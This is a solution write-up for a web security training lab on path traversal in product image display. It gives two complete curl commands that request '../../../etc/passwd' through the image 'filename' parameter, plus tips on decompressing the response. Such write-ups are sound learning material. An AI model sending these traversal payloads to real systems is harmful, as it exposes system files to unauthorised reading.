# Lab Description
This lab contains a **path traversal vulnerability in the display of product images**.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

# Lab Solution

We open the page in `dev mode` and see there are 3 types of relative URL paths in the code:
- First type pointing directly to the resource
- Second type with query parameter `filename`
- Third type with query parameter `productID`




Note: If you copy the command as curl

`Accept-Encoding: gzip, deflate, br` rules how things will be downloaded from the server.


If `Copy as curl command (bash)` is used it copies the request in following way.


```
curl -i -s -k -X $'GET' \
    -H $'Host: 0abf0096033c0eca80fadfba00360066.web-security-academy.net' -H $'Sec-Ch-Ua: \"Chromium\";v=\"117\", \"Not;A=Brand\";v=\"8\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36' -H $'Sec-Ch-Ua-Platform: \"Linux\"' -H $'Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: no-cors' -H $'Sec-Fetch-Dest: image' -H $'Referer: https://0abf0096033c0eca80fadfba00360066.web-security-academy.net/' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' \
    -b $'session=sBeE3fEhx4nSuCUZYaImFOdcncS92EsG' \
    $'https://0abf0096033c0eca80fadfba00360066.web-security-academy.net/image?filename=../../../../etc/passwd'
```

Most of the time, this will yield no results due to the compression.
Two options are viable:
- Delete header `$'Accept-Encoding: gzip, deflate, br'`
- Append flag `--compressed`; this allows to automatically decompress HTTP response if the compression in use is one of the algorithms `curl` supports.

#### Alternative:

Possible to pipe the result to `gzip -d` to get decompressed result, however, the flag `-i` or `--include`, which includes HTTP response headers in the output. This disable possibility to decompress with `gzip`.

```
curl 'https://0a3e00d60391d47d8045a3fd005b00ef.web-security-academy.net/image?filename=../../../etc/passwd' \
  -H 'authority: 0a3e00d60391d47d8045a3fd005b00ef.web-security-academy.net' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: session=ciUxesTOw5cfzikNAIome0NNvhD64svz' \
  -H 'sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: none' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36' \
  --compressed \
  --insecure
```
